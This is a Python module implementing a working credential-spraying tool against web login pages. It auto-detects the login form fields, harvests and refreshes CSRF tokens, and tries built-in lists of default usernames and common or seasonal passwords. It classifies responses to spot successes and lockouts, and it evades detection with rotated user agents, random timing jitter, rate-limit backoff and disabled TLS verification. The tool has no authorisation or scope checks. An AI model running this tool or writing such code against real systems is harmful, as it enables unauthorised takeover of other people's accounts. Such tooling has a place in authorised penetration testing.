# utils/credential_sprayer.py
import asyncio
import aiohttp
import time
import re
import json
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


class SprayResult(Enum):
    SUCCESS = "success"
    LOCKED = "locked"
    INVALID = "invalid"
    RATE_LIMITED = "rate_limited"
    CAPTCHA = "captcha"
    ERROR = "error"
    UNKNOWN = "unknown"


class AuthType(Enum):
    FORM_POST = "form_post"
    JSON_POST = "json_post"
    BASIC_AUTH = "basic_auth"
    BEARER_HEADER = "bearer_header"
    XML_POST = "xml_post"


@dataclass
class AttemptResult:
    username: str
    password: str
    status_code: int
    result: SprayResult
    response_length: int
    latency_ms: float
    location_header: Optional[str]
    set_cookie: Optional[str]
    response_snippet: str
    attempt_index: int
    notes: str = ""


@dataclass
class LockoutProfile:
    threshold_detected: bool
    lockout_after: int
    lockout_status_codes: list[int]
    lockout_body_patterns: list[str]
    recovery_seconds: int
    notes: str = ""


@dataclass
class SprayReport:
    target_url: str
    auth_type: AuthType
    total_attempts: int
    successes: list[AttemptResult] = field(default_factory=list)
    lockouts: list[AttemptResult] = field(default_factory=list)
    rate_limits: list[AttemptResult] = field(default_factory=list)
    all_attempts: list[AttemptResult] = field(default_factory=list)
    lockout_profile: Optional[LockoutProfile] = None
    baseline_status: int = 0
    baseline_length: int = 0
    duration_seconds: float = 0.0


DEFAULT_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "info",
    "support", "service", "manager", "superuser", "sysadmin", "webmaster",
    "operator", "backup", "deploy", "devops", "api", "app", "system",
    "monitor", "nagios", "zabbix", "jenkins", "gitlab", "git", "dev",
    "staging", "production", "demo", "sales", "marketing", "hr",
    "finance", "legal", "it", "help", "helpdesk", "noc", "soc",
]

DEFAULT_PASSWORDS = [
    "password", "Password1", "Password123", "password123", "admin",
    "admin123", "Admin123", "123456", "12345678", "1234567890",
    "qwerty", "Qwerty123", "letmein", "welcome", "Welcome1",
    "monkey", "dragon", "master", "sunshine", "shadow",
    "iloveyou", "trustno1", "superman", "batman",
    "changeme", "changeme123", "Change123", "temp", "temp123",
    "Temp1234", "default", "Default1", "pass", "Pass1234",
    "abc123", "Abc12345", "test", "test123", "Test1234",
    "demo", "demo123", "guest", "guest123",
    "root", "root123", "Root1234", "toor",
    "alpine", "ubnt", "raspberry", "synology",
    "P@ssw0rd", "P@ssword1", "P@$$w0rd",
    "Summer2024", "Winter2024", "Spring2024", "Fall2024",
    "Summer2025", "Winter2025", "Spring2025",
    "Company1", "Company123", "Company@123",
]

LOCKOUT_STATUS_CODES = {423, 429, 403}

LOCKOUT_BODY_PATTERNS = [
    re.compile(r"account.{0,20}(locked|suspended|disabled|blocked)", re.I),
    re.compile(r"too many.{0,20}(attempts|requests|failures|logins)", re.I),
    re.compile(r"(temporarily|account).{0,20}(locked|blocked|disabled)", re.I),
    re.compile(r"try again.{0,20}(later|minute|hour)", re.I),
    re.compile(r"maximum.{0,20}(login|attempt|retry).{0,20}(exceeded|reached)", re.I),
    re.compile(r"security.{0,20}(lockout|hold|block)", re.I),
    re.compile(r"(brute.?force|rate.?limit).{0,30}detected", re.I),
    re.compile(r"your.{0,20}(account|ip).{0,20}(has been|is).{0,20}(locked|blocked|banned)", re.I),
]

RATE_LIMIT_PATTERNS = [
    re.compile(r"rate.{0,10}limit", re.I),
    re.compile(r"slow.{0,10}down", re.I),
    re.compile(r"too many requests", re.I),
    re.compile(r"request.{0,20}throttl", re.I),
    re.compile(r"429", re.I),
]

CAPTCHA_PATTERNS = [
    re.compile(r"captcha", re.I),
    re.compile(r"recaptcha", re.I),
    re.compile(r"hcaptcha", re.I),
    re.compile(r"i am not a robot", re.I),
    re.compile(r"verify you are human", re.I),
    re.compile(r"bot.{0,10}detect", re.I),
    re.compile(r"cf-turnstile", re.I),
    re.compile(r"challenge-form", re.I),
]

SUCCESS_STATUS_CODES = {200, 201, 302}

SUCCESS_BODY_PATTERNS = [
    re.compile(r"(welcome|dashboard|logout|sign.?out|my.account|profile)", re.I),
    re.compile(r"(successfully|logged.in|login.success|authenticated)", re.I),
]

SUCCESS_LOCATION_PATTERNS = [
    re.compile(r"/(dashboard|home|admin|profile|account|portal|panel|app|index)", re.I),
]

FAILURE_BODY_PATTERNS = [
    re.compile(r"(invalid|incorrect|wrong|failed|bad).{0,30}(password|credential|login|username|user)", re.I),
    re.compile(r"(password|credential|login|username).{0,30}(invalid|incorrect|wrong|failed|bad)", re.I),
    re.compile(r"authentication.{0,20}fail", re.I),
    re.compile(r"login.{0,20}fail", re.I),
    re.compile(r"access.{0,10}denied", re.I),
    re.compile(r"not.{0,10}authorized", re.I),
]

COMMON_FIELD_NAMES = {
    "username": ["username", "user", "login", "email", "usr", "user_name",
                 "uname", "userid", "user_id", "account", "name", "identifier"],
    "password": ["password", "pass", "passwd", "pwd", "secret", "passphrase",
                 "pass_word", "user_password", "current_password"],
}


def _detect_auth_type(html: str, target_url: str) -> tuple[AuthType, dict]:
    fields: dict[str, str] = {}

    form_pattern = re.compile(
        r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>',
        re.DOTALL | re.IGNORECASE
    )
    input_pattern = re.compile(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']+)["\'])?[^>]*>',
        re.IGNORECASE
    )

    for form_match in form_pattern.finditer(html):
        form_html = form_match.group(2)
        inputs = input_pattern.findall(form_html)
        for name, itype in inputs:
            name_lower = name.lower()
            for canonical, aliases in COMMON_FIELD_NAMES.items():
                if any(alias in name_lower for alias in aliases):
                    fields[canonical] = name
            if itype.lower() == "hidden":
                fields[f"_hidden_{name}"] = name

    if fields.get("username") and fields.get("password"):
        return AuthType.FORM_POST, fields

    if "application/json" in html.lower() or "json" in target_url.lower():
        return AuthType.JSON_POST, {"username": "username", "password": "password"}

    if "/api/" in target_url or "/v1/" in target_url or "/v2/" in target_url:
        return AuthType.JSON_POST, {"username": "username", "password": "password"}

    if not fields.get("username"):
        fields["username"] = "username"
    if not fields.get("password"):
        fields["password"] = "password"

    return AuthType.FORM_POST, fields
    

def _extract_csrf_token(html: str) -> Optional[tuple[str, str]]:
    patterns = [
        re.compile(r'<input[^>]+name=["\'](_token|csrf_token|csrfToken|authenticity_token|__RequestVerificationToken|_csrf)["\'][^>]+value=["\']([^"\']+)["\']', re.I),
        re.compile(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']', re.I),
        re.compile(r'"csrf[_-]?token"\s*:\s*"([^"]+)"', re.I),
        re.compile(r"window\._token\s*=\s*['\"]([^'\"]+)['\"]", re.I),
    ]
    for p in patterns:
        m = p.search(html)
        if m:
            groups = m.groups()
            if len(groups) == 2:
                return groups[0], groups[1]
            elif len(groups) == 1:
                return "csrf_token", groups[0]
    return None


def _classify_response(
    status: int,
    body: bytes,
    location: Optional[str],
    baseline_status: int,
    baseline_length: int,
) -> SprayResult:
    body_text = body.decode("utf-8", errors="ignore")
    body_len = len(body)

    if status in LOCKOUT_STATUS_CODES or status == 423:
        for pattern in LOCKOUT_BODY_PATTERNS:
            if pattern.search(body_text):
                return SprayResult.LOCKED
        if status == 423:
            return SprayResult.LOCKED

    if status == 429:
        return SprayResult.RATE_LIMITED

    for pattern in RATE_LIMIT_PATTERNS:
        if pattern.search(body_text):
            return SprayResult.RATE_LIMITED

    for pattern in CAPTCHA_PATTERNS:
        if pattern.search(body_text):
            return SprayResult.CAPTCHA

    for pattern in LOCKOUT_BODY_PATTERNS:
        if pattern.search(body_text):
            return SprayResult.LOCKED

    if status == 302 and location:
        for lp in SUCCESS_LOCATION_PATTERNS:
            if lp.search(location):
                return SprayResult.SUCCESS
        if "login" not in location.lower() and "error" not in location.lower():
            return SprayResult.SUCCESS

    if status == 200:
        for p in SUCCESS_BODY_PATTERNS:
            if p.search(body_text):
                return SprayResult.SUCCESS

    for p in FAILURE_BODY_PATTERNS:
        if p.search(body_text):
            return SprayResult.INVALID

    if status in (401, 403):
        return SprayResult.INVALID

    if status in (500, 502, 503, 504, 0, -1):
        return SprayResult.ERROR

    length_delta = abs(body_len - baseline_length)
    if baseline_status == status and length_delta < 50:
        return SprayResult.INVALID

    return SprayResult.UNKNOWN


def _build_payload(
    auth_type: AuthType,
    fields: dict,
    username: str,
    password: str,
    extra: dict,
) -> tuple[Optional[str], Optional[dict], Optional[str]]:
    u_field = fields.get("username", "username")
    p_field = fields.get("password", "password")
    hidden = {k.replace("_hidden_", ""): v for k, v in fields.items() if k.startswith("_hidden_")}

    if auth_type == AuthType.JSON_POST:
        payload = {u_field: username, p_field: password, **extra}
        return None, None, json.dumps(payload)

    if auth_type == AuthType.FORM_POST:
        data = {u_field: username, p_field: password, **hidden, **extra}
        return urlencode(data), None, None

    if auth_type == AuthType.BASIC_AUTH:
        return None, {"username": username, "password": password}, None

    return urlencode({u_field: username, p_field: password}), None, None


async def _get_page(
    session: aiohttp.ClientSession,
    url: str,
    headers: dict,
) -> tuple[int, str, dict]:
    try:
        async with session.get(
            url,
            headers=headers,
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=12),
            ssl=False,
        ) as resp:
            body = await resp.read()
            return resp.status, body.decode("utf-8", errors="ignore"), dict(resp.headers)
    except Exception:
        return 0, "", {}


async def _attempt(
    session: aiohttp.ClientSession,
    url: str,
    method: str,
    auth_type: AuthType,
    form_data: Optional[str],
    basic_auth: Optional[dict],
    json_body: Optional[str],
    headers: dict,
    attempt_index: int,
    username: str,
    password: str,
    baseline_status: int,
    baseline_length: int,
    semaphore: asyncio.Semaphore,
) -> AttemptResult:
    async with semaphore:
        req_headers = dict(headers)
        if auth_type == AuthType.JSON_POST:
            req_headers["Content-Type"] = "application/json"
        elif auth_type == AuthType.FORM_POST:
            req_headers["Content-Type"] = "application/x-www-form-urlencoded"

        t0 = time.monotonic()
        try:
            kwargs: dict = {
                "headers": req_headers,
                "allow_redirects": False,
                "timeout": aiohttp.ClientTimeout(total=12),
                "ssl": False,
            }
            if form_data is not None:
                kwargs["data"] = form_data
            elif json_body is not None:
                kwargs["data"] = json_body
            elif basic_auth is not None:
                kwargs["auth"] = aiohttp.BasicAuth(
                    basic_auth["username"], basic_auth["password"]
                )

            async with session.request(method, url, **kwargs) as resp:
                body = await resp.read()
                latency = (time.monotonic() - t0) * 1000
                status = resp.status
                resp_headers = dict(resp.headers)
                location = resp_headers.get("Location") or resp_headers.get("location")
                set_cookie = resp_headers.get("Set-Cookie") or resp_headers.get("set-cookie")

        except asyncio.TimeoutError:
            return AttemptResult(
                username=username, password=password,
                status_code=0, result=SprayResult.ERROR,
                response_length=0, latency_ms=(time.monotonic() - t0) * 1000,
                location_header=None, set_cookie=None,
                response_snippet="TIMEOUT", attempt_index=attempt_index,
            )
        except Exception as e:
            return AttemptResult(
                username=username, password=password,
                status_code=-1, result=SprayResult.ERROR,
                response_length=0, latency_ms=(time.monotonic() - t0) * 1000,
                location_header=None, set_cookie=None,
                response_snippet=str(e)[:150], attempt_index=attempt_index,
            )

        result = _classify_response(status, body, location, baseline_status, baseline_length)
        snippet = body[:300].decode("utf-8", errors="ignore").replace("\n", " ")

        return AttemptResult(
            username=username,
            password=password,
            status_code=status,
            result=result,
            response_length=len(body),
            latency_ms=round(latency, 2),
            location_header=location,
            set_cookie=set_cookie,
            response_snippet=snippet,
            attempt_index=attempt_index,
        )


def _build_lockout_profile(attempts: list[AttemptResult]) -> LockoutProfile:
    locked = [a for a in attempts if a.result == SprayResult.LOCKED]
    rate_limited = [a for a in attempts if a.result == SprayResult.RATE_LIMITED]

    if not locked and not rate_limited:
        return LockoutProfile(
            threshold_detected=False,
            lockout_after=0,
            lockout_status_codes=[],
            lockout_body_patterns=[],
            recovery_seconds=0,
            notes="No lockout or rate limiting observed",
        )

    first_lock = min(locked + rate_limited, key=lambda a: a.attempt_index)
    lockout_codes = list({a.status_code for a in locked + rate_limited if a.status_code > 0})

    total_invalid_before_lock = len([
        a for a in attempts
        if a.attempt_index < first_lock.attempt_index and a.result == SprayResult.INVALID
    ])

    return LockoutProfile(
        threshold_detected=True,
        lockout_after=total_invalid_before_lock,
        lockout_status_codes=lockout_codes,
        lockout_body_patterns=[],
        recovery_seconds=0,
        notes=f"First lockout at attempt #{first_lock.attempt_index} after ~{total_invalid_before_lock} failures",
    )


class CredentialSprayer:
    def __init__(
        self,
        concurrency: int = 1,
        delay: float = 2.0,
        jitter: float = 1.0,
        max_attempts: int = 500,
        stop_on_lockout: bool = True,
        stop_on_success: bool = False,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        custom_usernames: Optional[list[str]] = None,
        custom_passwords: Optional[list[str]] = None,
        auth_type_override: Optional[AuthType] = None,
        field_override: Optional[dict] = None,
        extra_fields: Optional[dict] = None,
        rotate_user_agents: bool = True,
    ):
        self.concurrency = concurrency
        self.delay = delay
        self.jitter = jitter
        self.max_attempts = max_attempts
        self.stop_on_lockout = stop_on_lockout
        self.stop_on_success = stop_on_success
        self.usernames = custom_usernames or DEFAULT_USERNAMES
        self.passwords = custom_passwords or DEFAULT_PASSWORDS
        self.auth_type_override = auth_type_override
        self.field_override = field_override
        self.extra_fields = extra_fields or {}
        self.rotate_user_agents = rotate_user_agents
        self._ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
            user_agent,
        ]
        self._base_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cache-Control": "no-cache",
            "Referer": "",
        }

    def _next_ua(self, index: int) -> str:
        if not self.rotate_user_agents:
            return self._ua_pool[-1]
        return self._ua_pool[index % len(self._ua_pool)]

    async def run(self, target_url: str) -> SprayReport:
        import random
        t_start = time.monotonic()

        parsed = urlparse(target_url)
        self._base_headers["Referer"] = f"{parsed.scheme}://{parsed.netloc}/"

        connector = aiohttp.TCPConnector(ssl=False, limit=max(self.concurrency, 2))
        async with aiohttp.ClientSession(connector=connector) as session:
            page_status, page_html, page_headers = await _get_page(
                session, target_url, self._base_headers
            )

            if self.auth_type_override and self.field_override:
                auth_type = self.auth_type_override
                fields = self.field_override
            else:
                auth_type, fields = _detect_auth_type(page_html, target_url)

            csrf = _extract_csrf_token(page_html)
            extra = dict(self.extra_fields)
            if csrf:
                extra[csrf[0]] = csrf[1]

            baseline_status, baseline_html, _ = await _get_page(
                session, target_url, self._base_headers
            )
            baseline_length = len(baseline_html.encode("utf-8", errors="ignore"))

            report = SprayReport(
                target_url=target_url,
                auth_type=auth_type,
                total_attempts=0,
                baseline_status=baseline_status,
                baseline_length=baseline_length,
            )

            semaphore = asyncio.Semaphore(self.concurrency)
            attempt_idx = 0
            halt = False

            for password in self.passwords:
                if halt:
                    break
                if attempt_idx >= self.max_attempts:
                    break

                batch = []
                for username in self.usernames:
                    if halt:
                        break
                    if attempt_idx >= self.max_attempts:
                        break

                    headers = dict(self._base_headers)
                    headers["User-Agent"] = self._next_ua(attempt_idx)

                    if csrf:
                        page_status2, page_html2, _ = await _get_page(
                            session, target_url, headers
                        )
                        csrf2 = _extract_csrf_token(page_html2)
                        if csrf2:
                            extra[csrf2[0]] = csrf2[1]

                    form_data, basic_auth, json_body = _build_payload(
                        auth_type, fields, username, password, extra
                    )

                    jitter_sleep = self.delay + random.uniform(0, self.jitter)
                    await asyncio.sleep(jitter_sleep)

                    result = await _attempt(
                        session=session,
                        url=target_url,
                        method="POST",
                        auth_type=auth_type,
                        form_data=form_data,
                        basic_auth=basic_auth,
                        json_body=json_body,
                        headers=headers,
                        attempt_index=attempt_idx,
                        username=username,
                        password=password,
                        baseline_status=baseline_status,
                        baseline_length=baseline_length,
                        semaphore=semaphore,
                    )

                    report.all_attempts.append(result)
                    attempt_idx += 1

                    if result.result == SprayResult.SUCCESS:
                        report.successes.append(result)
                        if self.stop_on_success:
                            halt = True
                            break

                    elif result.result == SprayResult.LOCKED:
                        report.lockouts.append(result)
                        if self.stop_on_lockout:
                            halt = True
                            break

                    elif result.result == SprayResult.RATE_LIMITED:
                        report.rate_limits.append(result)
                        await asyncio.sleep(self.delay * 5)

                    elif result.result == SprayResult.CAPTCHA:
                        halt = True
                        break

        report.total_attempts = attempt_idx
        report.lockout_profile = _build_lockout_profile(report.all_attempts)
        report.duration_seconds = time.monotonic() - t_start
        return report

    def run_sync(self, target_url: str) -> SprayReport:
        return asyncio.run(self.run(target_url))


def serialize_report(report: SprayReport, include_all: bool = False) -> dict:
    def attempt_to_dict(a: AttemptResult) -> dict:
        return {
            "index": a.attempt_index,
            "username": a.username,
            "password": a.password,
            "status": a.status_code,
            "result": a.result.value,
            "length": a.response_length,
            "latency_ms": a.latency_ms,
            "location": a.location_header,
            "set_cookie": a.set_cookie,
            "snippet": a.response_snippet[:200],
            "notes": a.notes,
        }

    def lockout_to_dict(lp: Optional[LockoutProfile]) -> dict:
        if not lp:
            return {}
        return {
            "detected": lp.threshold_detected,
            "lockout_after": lp.lockout_after,
            "lockout_codes": lp.lockout_status_codes,
            "recovery_seconds": lp.recovery_seconds,
            "notes": lp.notes,
        }

    result_counts: dict[str, int] = {}
    for a in report.all_attempts:
        result_counts[a.result.value] = result_counts.get(a.result.value, 0) + 1

    out = {
        "target": report.target_url,
        "auth_type": report.auth_type.value,
        "total_attempts": report.total_attempts,
        "duration_seconds": round(report.duration_seconds, 2),
        "baseline_status": report.baseline_status,
        "baseline_length": report.baseline_length,
        "result_summary": result_counts,
        "success_count": len(report.successes),
        "lockout_count": len(report.lockouts),
        "rate_limit_count": len(report.rate_limits),
        "lockout_profile": lockout_to_dict(report.lockout_profile),
        "successes": [attempt_to_dict(a) for a in report.successes],
        "lockouts": [attempt_to_dict(a) for a in report.lockouts],
        "rate_limits": [attempt_to_dict(a) for a in report.rate_limits],
    }

    if include_all:
        out["all_attempts"] = [attempt_to_dict(a) for a in report.all_attempts]

    return out


def run_credential_spray(
    target_url: str,
    usernames: Optional[list[str]] = None,
    passwords: Optional[list[str]] = None,
    delay: float = 2.0,
    jitter: float = 1.0,
    stop_on_success: bool = False,
    stop_on_lockout: bool = True,
    max_attempts: int = 500,
    auth_type: Optional[str] = None,
    extra_fields: Optional[dict] = None,
    include_all_attempts: bool = False,
) -> dict:
    auth_type_enum = None
    if auth_type:
        try:
            auth_type_enum = AuthType(auth_type)
        except ValueError:
            pass

    sprayer = CredentialSprayer(
        concurrency=1,
        delay=delay,
        jitter=jitter,
        max_attempts=max_attempts,
        stop_on_lockout=stop_on_lockout,
        stop_on_success=stop_on_success,
        custom_usernames=usernames,
        custom_passwords=passwords,
        auth_type_override=auth_type_enum,
        extra_fields=extra_fields or {},
    )
    report = sprayer.run_sync(target_url)
    return serialize_report(report, include_all=include_all_attempts)